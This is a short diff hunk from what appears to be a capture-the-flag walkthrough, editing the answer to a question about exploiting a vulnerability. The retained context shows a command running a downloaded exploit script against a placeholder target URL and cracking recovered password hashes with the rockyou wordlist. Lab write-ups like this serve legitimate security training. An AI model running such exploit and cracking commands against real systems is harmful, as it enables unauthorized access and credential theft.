@@ -73,7 +73,7 @@ Finished
 
 ## 6. Exploiting the Vulnerability
 **Question:** What can you leverage to exploit the vulnerability?  
-**Answer:** After downloading the exploit file from the page shown in the screenshot, run the following command:  
+**Answer:**   
 **Command:**
 ```bash
 python 46635.py -u http://[Target_Machine_Ip]/simple --crack -w /usr/share/wordlists/rockyou.txt
